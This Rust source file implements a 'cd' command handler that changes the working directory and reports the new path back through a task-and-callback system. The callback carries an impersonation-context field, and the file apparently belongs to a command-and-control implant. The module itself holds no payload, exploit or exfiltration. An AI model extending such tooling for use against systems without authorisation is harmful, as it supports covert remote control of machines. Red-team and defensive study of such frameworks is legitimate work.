use crate::structs::{CallbackUpdate, Task};
use serde::Deserialize;

#[derive(Deserialize)]
struct CdArgs {
    path: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: CdArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => CdArgs { path: task.data.params.clone() },
    };

    match std::env::set_current_dir(&args.path) {
        Ok(_) => {
            let cwd = std::env::current_dir()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| args.path.clone());
            response.user_output = format!("Changed directory to {}", cwd);
            response.completed = true;
            response.callback_update = Some(CallbackUpdate {
                cwd: Some(cwd),
                impersonation_context: None,
            });
        }
        Err(e) => {
            response.set_error(&format!("Failed to change directory: {}", e));
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
